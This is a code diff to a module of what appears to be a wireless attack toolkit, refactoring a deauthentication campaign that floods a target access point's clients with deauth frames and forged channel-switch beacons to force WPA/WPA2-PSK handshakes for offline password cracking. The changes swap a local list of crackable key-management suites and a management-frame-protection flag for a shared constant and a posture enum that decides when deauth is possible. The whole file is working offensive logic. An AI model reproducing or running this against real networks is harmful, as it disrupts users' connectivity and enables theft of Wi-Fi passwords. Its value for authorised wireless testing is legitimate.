@@ -14,8 +14,10 @@ import logging
 from typing import Optional
 
 from wifit3.campaigns.eviltwin.campaign import csa_target_channel
-from wifit3.crack.handshake import crackable_pairs, pmkid_crackable
+from wifit3.crack.handshake import PSK_CAPTURE_AKMS, crackable_pairs, pmkid_crackable
 from wifit3.dot11.csa import build_csa_beacon
+from wifit3.dot11.pmf import PmfPosture
+from wifit3.models import AccessPoint
 
 from . import treelog
 from .campaign import Campaign
@@ -27,8 +29,6 @@ BCAST_COUNT = 20         # broadcast-deauth frames at the end of each round
 SETTLE_SEC = 6.0         # wait after a burst for the provoked handshake to land
 CSA_COUNT = 16           # CSA beacons per burst
 CSA_GAP_SEC = 0.104      # ~one beacon interval (100 TU) between CSA beacons
-
-_PSK_AKMS = (0x02, 0x04, 0x06)   # PSK, FT-PSK, PSK-SHA256: yield a crackable 4-way
 
 
 class DeauthCampaign(Campaign):
@@ -43,14 +43,15 @@ class DeauthCampaign(Campaign):
     run_variant = "error"
 
     @classmethod
-    def visible(cls, ap) -> bool:
+    def visible(cls, ap: AccessPoint) -> bool:
         """WPA/WPA2-PSK only: a PSK-family AKM must be confirmed. Hides WEP/open/SAE-only/unconfirmed."""
-        return bool(set(_PSK_AKMS) & set(getattr(ap, "akm_suites", None) or ()))
+        return bool(PSK_CAPTURE_AKMS & set(ap.akm_suites))
 
     @classmethod
-    def ineligible_reason(cls, ap) -> Optional[str]:
-        if getattr(ap, "pmf_required", False) and not getattr(ap, "last_beacon_frame", None):
-            return "PMF required: CSA needs a captured beacon"
+    def ineligible_reason(cls, ap: AccessPoint) -> Optional[str]:
+        if (ap.pmf_posture in (PmfPosture.REQUIRED, PmfPosture.INVALID)
+                and not ap.last_beacon_frame):
+            return "PMF required or invalid: CSA needs a captured beacon"
         return None
 
     def status_under_card(self) -> str:
@@ -114,18 +115,18 @@ class DeauthCampaign(Campaign):
 
     async def _loop(self) -> None:
         self._baseline = self._crackable_count()
-        pmf_required = getattr(self.target, "pmf_required", False)
+        deauth_allowed = self.target.pmf_posture in (PmfPosture.DISABLED, PmfPosture.OPTIONAL)
         csa = self._csa_frame()
-        if pmf_required and csa is None:
-            self.log(treelog.leaf("PMF required and no beacon captured: nothing to send"))
+        if not deauth_allowed and csa is None:
+            self.log(treelog.leaf("PMF required or invalid and no beacon captured: nothing to send"))
             return
-        if pmf_required:
-            self.log(treelog.leaf("PMF required: CSA only"))
+        if not deauth_allowed:
+            self.log(treelog.leaf("PMF required or invalid: CSA only"))
         else:
             self.log(treelog.leaf(f"targeting {len(self._target_clients())} client(s) + broadcast"))
         async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
             while not self.stopped and not self._new_capture():
-                if not pmf_required:
+                if deauth_allowed:
                     for mac in self._target_clients():
                         if self.stopped or self._new_capture():
                             break
